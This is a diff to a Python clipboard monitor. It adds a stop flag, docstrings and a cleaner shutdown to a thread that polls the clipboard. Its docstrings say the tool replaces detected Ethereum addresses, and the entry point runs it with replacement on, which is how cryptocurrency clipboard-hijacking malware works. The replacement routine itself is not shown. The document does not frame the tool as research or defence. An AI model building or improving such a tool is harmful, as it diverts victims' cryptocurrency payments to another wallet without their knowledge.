@@ -32,10 +32,19 @@ def show_notification(title, message):
     if notification:
         notification.notify(title=title, message=message, timeout=3)
 
-def clipboard_monitor(replace=False, patterns=None):
+def clipboard_monitor(replace=False, patterns=None, stop_flag=None):
+    """
+    Monitor clipboard for pattern matches and optionally replace content.
+
+    Args:
+        replace: If True, replace detected Ethereum addresses
+        patterns: Dictionary of patterns to monitor
+        stop_flag: threading.Event() to signal when to stop monitoring
+    """
     if patterns is None:
         patterns = PATTERNS
     last_text = ""
+    print("[+] Clipboard monitor started")
     while True:
         try:
             text = pyperclip.paste()
@@ -71,13 +80,32 @@ def print_clipboard_history():
         print(f"{i}: {entry}")
     print("------------------------\n")
 
-def start_clipboard_monitor(replace=False, patterns=None):
-    t = threading.Thread(target=clipboard_monitor, args=(replace, patterns), daemon=True)
+def start_clipboard_monitor(replace=False, patterns=None, stop_flag=None):
+    """
+    Start clipboard monitoring in a separate thread.
+
+    Args:
+        replace: If True, replace detected Ethereum addresses
+        patterns: Dictionary of patterns to monitor
+        stop_flag: threading.Event() to signal when to stop monitoring
+
+    Returns:
+        The thread object
+    """
+    t = threading.Thread(
+        target=clipboard_monitor,
+        args=(replace, patterns, stop_flag),
+        daemon=True
+    )
     t.start()
+    return t
 
 if __name__ == "__main__":
+    # For standalone testing
+    stop_flag = threading.Event()
+
     # Set replace=True to enable replacement
-    start_clipboard_monitor(replace=True)
+    monitor_thread = start_clipboard_monitor(replace=True, stop_flag=stop_flag)
     print("Clipboard monitor started. Press Ctrl+C to exit.")
     print("Type 'history' and press Enter to view clipboard history.")
     try:
@@ -86,4 +114,7 @@ if __name__ == "__main__":
             if cmd.strip().lower() == "history":
                 print_clipboard_history()
     except KeyboardInterrupt:
+        print("\nStopping clipboard monitor...")
+        stop_flag.set()
+        monitor_thread.join(timeout=2)
         print("Exiting.")
